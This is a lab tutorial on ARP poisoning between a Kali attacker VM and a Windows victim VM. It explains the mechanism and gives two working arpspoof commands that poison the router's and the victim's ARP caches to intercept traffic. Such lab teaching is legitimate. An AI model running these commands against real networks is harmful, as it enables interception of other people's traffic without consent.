
ARP Poisoning (also called ARP Spoofing) is a **man-in-the-middle attack** that exploits the ARP (Address Resolution Protocol) to intercept network traffic between two devices. The attacker sends falsified ARP messages to link their MAC address with the IP address of a legitimate device, causing network traffic to be redirected through the attacker's machine.

**How it works:**

1. ARP is stateless and doesn't verify responses

2. Attackers send gratuitous ARP replies associating their MAC with target IPs

3. Network devices update their ARP caches with the fake mapping

4. Traffic flows through the attacker's machine (can be intercepted/modified)

----------
### Normal communication

```
Windows (Victim)  →  Router  →  Internet
```

### During ARP Poisoning

```
Windows (Victim) → Attacker (Linux) → Router → Internet
```

----------

## How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.


Physical Address and IP of Windows System ---->

```
Physical Address. . . . . . . . . : 00-0C-29-5B-B9-15

 IPv4 Address. . . . . . . . . . . : 192.168.229.132
```


Physical Address and IP of Linux System ---->

```
ether 00:0c:29:f2:93:7b

inet 192.168.229.131
```

Router IP adress ---->

```
192.168.229.2
```

---------------
## Attack :

```
sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132 
```

This command performs **ARP spoofing against the router** by sending fake ARP replies that map the **Windows victim’s IP address** to the **attacker’s MAC address**.

### What it achieves

- Poisons the **router’s ARP cache**

- Redirects packets meant for **Windows → Kali**

- Intercepts **incoming traffic** (router → victim)

```
sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
```

